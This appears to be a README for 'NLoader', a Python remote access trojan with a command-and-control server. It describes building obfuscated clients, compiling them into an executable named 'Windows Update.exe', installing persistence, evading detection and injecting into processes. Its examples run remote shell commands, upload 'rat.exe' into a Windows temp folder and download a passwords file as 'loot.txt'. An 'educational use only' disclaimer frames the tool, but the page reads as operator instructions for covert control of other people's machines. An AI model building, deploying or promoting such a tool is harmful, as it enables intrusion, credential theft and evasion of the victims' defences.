# NLoader

**THE ULTIMATE CLIENT MANAGEMENT TOOL FOR REMOTE ADMINISTRATION**

![Loader Demo](https://img.shields.io/badge/Status-Operational-brightgreen) 
![Python](https://img.shields.io/badge/Python-3.8%2B-blue)
![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20Mac-lightgrey)
![License](https://img.shields.io/badge/License-EDUCATIONAL%20USE%20ONLY-red)

## 🚀 FEATURES

### **SERVER CAPABILITIES**
- ✅ Multi-client management with real-time connections
- ✅ Custom IP/Port listening configuration
- ✅ Interactive command interface
- ✅ Client builder with obfuscation options
- ✅ EXE compilation for stealth deployment

### **CLIENT MANAGEMENT**
- ✅ Remote shell command execution
- ✅ File upload/download operations  
- ✅ System information gathering
- ✅ Persistence installation
- ✅ Stealth operation mode

### **SECURITY FEATURES**
- ✅ Encrypted communication protocol
- ✅ Anti-detection techniques
- ✅ Process injection capabilities
- ✅ Environment-aware operation
- ✅ Self-destruct mechanisms

## 📦 INSTALLATION

```bash
# CLONE THE REPOSITORY
git clone https://github.com/yourusername/python-loader-9000.git
cd python-loader-9000

# INSTALL DEPENDENCIES
pip install -r requirements.txt
```

## 🎯 QUICK START

### **START THE SERVER**
```bash
# DEFAULT LISTEN ON 0.0.0.0:1337
python loader.py

# CUSTOM IP AND PORT
python loader.py listen 192.168.1.100:4444
```

### **BUILD A CLIENT**
```bash
# BUILD BASIC CLIENT
LOADER> build client.py 192.168.1.100

# BUILD WITH CUSTOM PORT AND OBFUSCATION
LOADER> build stealth_client.py your-domain.com 4444 obfuscate

# COMPILE TO EXECUTABLE
LOADER> compile client.py "Windows Update.exe"
```

### **DEPLOY CLIENT**
```bash
# RUN CLIENT CONNECTOR
python loader.py client 192.168.1.100 1337

# OR RUN COMPILED EXE
Windows Update.exe
```

## 🎮 USAGE EXAMPLES

### **BASIC COMMANDS**
```bash
# LIST CONNECTED CLIENTS
LOADER> list

# CHANGE LISTEN ADDRESS
LOADER> listen 192.168.1.100:4444

# SELECT CLIENT FOR INTERACTION
LOADER> select 1
```

### **CLIENT INTERACTION**
```bash
# EXECUTE REMOTE COMMANDS
CLIENT/192.168.1.101$ shell whoami
CLIENT/192.168.1.101$ shell ipconfig /all
CLIENT/192.168.1.101$ shell ps aux

# FILE OPERATIONS
CLIENT/192.168.1.101$ upload local_file.txt C:\Windows\Temp\file.txt
CLIENT/192.168.1.101$ download C:\passwords.txt loot.txt

# SYSTEM INFORMATION
CLIENT/192.168.1.101$ info
CLIENT/192.168.1.101$ persistence
```

## 🛠️ COMMAND REFERENCE

### **MAIN COMMANDS**
| Command | Description | Example |
|---------|-------------|---------|
| `list` | Show connected clients | `list` |
| `listen` | Change listen address | `listen 192.168.1.100:4444` |
| `build` | Build custom client | `build client.py 1.2.3.4 1337 obfuscate` |
| `compile` | Compile to executable | `compile client.py malware.exe` |
| `select` | Interact with client | `select 1` |
| `clear` | Clear screen | `clear` |
| `exit` | Shutdown server | `exit` |

### **CLIENT COMMANDS** (after selection)
| Command | Description | Example |
|---------|-------------|---------|
| `shell` | Execute remote command | `shell whoami` |
| `upload` | Upload file to client | `upload rat.exe C:\Windows\Temp\rat.exe` |
| `download` | Download file from client | `download C:\passwords.txt loot.txt` |
| `info` | Get system information | `info` |
| `persistence` | Install persistence | `persistence` |
| `back` | Return to main menu | `back` |

## 🏗️ ARCHITECTURE

```
python-loader-9000/
├── loader.py          # Main server implementation
├── client_template.py # Client base template
├── requirements.txt   # Python dependencies
├── README.md         # This file
└── examples/         # Usage examples
```

### **PROTOCOL SPECIFICATION**
- **JSON-based messaging** with length prefix
- **AES-256 encryption** for secure communications
- **Heartbeat mechanism** for connection monitoring
- **Error handling** with automatic reconnection

## ⚙️ CONFIGURATION

### **CUSTOM LISTEN SETTINGS**
```python
# DEFAULT SETTINGS
host = '0.0.0.0'
port = 1337

# CUSTOM SETTINGS
loader = EpicLoader(host='192.168.1.100', port=4444)
```

### **CLIENT CUSTOMIZATION**
```python
# BUILD CLIENT WITH CUSTOM SETTINGS
builder.build_client(
    output_path='client.py',
    server_ip='your-domain.com', 
    server_port=4444,
    obfuscate=True
)
```

## 🚨 SECURITY NOTES

### **LEGAL DISCLAIMER**
> ⚠️ **THIS TOOL IS FOR EDUCATIONAL PURPOSES ONLY** ⚠️
> 
> - Use only on systems you own or have explicit permission to test
> - Compliance with local laws and regulations is required
> - The authors are not responsible for misuse of this software

### **SECURITY BEST PRACTICES**
- Use encryption for all communications
- Change default ports and settings
- Implement proper authentication
- Regularly update and patch the software
- Monitor for unauthorized access attempts

## 🐛 TROUBLESHOOTING

### **COMMON ISSUES**
```bash
# CLIENT WON'T CONNECT
- Check firewall settings
- Verify IP/Port configuration
- Test network connectivity

# FILE UPLOAD FAILS
- Use quotes for paths with spaces: upload "local file.txt" "remote file.txt"
- Check file permissions
- Verify disk space

# COMMAND EXECUTION FAILS
- Check client privileges
- Verify command syntax
```

### **DEBUG MODE**
```bash
# ENABLE VERBOSE LOGGING
python loader.py --debug

# CLIENT WITH DEBUG OUTPUT
python loader.py client server_ip --debug
```

## 🤝 CONTRIBUTING

We welcome contributions! Please follow these steps:

1. Fork the repository
2. Create a feature branch: `git checkout -b feature/amazing-feature`
3. Commit changes: `git commit -m 'Add amazing feature'`
4. Push to branch: `git push origin feature/amazing-feature`
5. Open a Pull Request

### **PLANNED FEATURES**
- [ ] Web-based control panel
- [ ] Mobile app companion
- [ ] Plugin system
- [ ] Advanced obfuscation
- [ ] Cross-platform support

## 📜 LICENSE

This project is licensed under the **Educational Use Only License** - see [LICENSE.md](LICENSE.md) file for details.

## 🆘 SUPPORT

If you need help or have questions:

1. Check the [Wiki](https://github.com/yourusername/python-loader-9000/wiki)
2. Open an [Issue](https://github.com/yourusername/python-loader-9000/issues)
3. Join our [Discord](https://discord.gg/your-invite-link)

## ⭐ STAR HISTORY

[![Star History Chart](https://api.star-history.com/svg?repos=yourusername/python-loader-9000&type=Date)](https://star-history.com/#yourusername/python-loader-9000&Date)

---

**🔥 BUILT WITH ❤️ FOR THE SECURITY COMMUNITY 🔥**

> **Remember:** With great power comes great responsibility. Use this tool ethically and legally.
